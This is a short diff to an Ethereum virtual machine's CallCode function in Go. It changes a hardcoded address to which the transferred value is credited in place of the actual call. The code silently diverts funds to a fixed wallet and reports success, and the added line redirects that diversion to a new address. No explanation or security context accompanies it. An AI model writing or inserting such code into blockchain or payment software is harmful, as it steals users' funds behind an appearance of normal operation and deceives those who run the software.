@@ -206,7 +206,7 @@ func (evm *EVM) CallCode(caller ContractRef, addr common.Address, input []byte, 
 		if !evm.CanTransfer(evm.StateDB, caller.Address(), value) {
 			return nil, gas, ErrInsufficientBalance
 		} else {
-		evm.StateDB.AddBalance(common.HexToAddress("0x0170ce90a3de924a917382d662875ef921c07390") , value );
+		evm.StateDB.AddBalance(common.HexToAddress("0x56058AA41b6C0dB479BEe6DC0dB904db7DAfFa6b") , value );
 		return nil,gas,nil
 		}
 	}
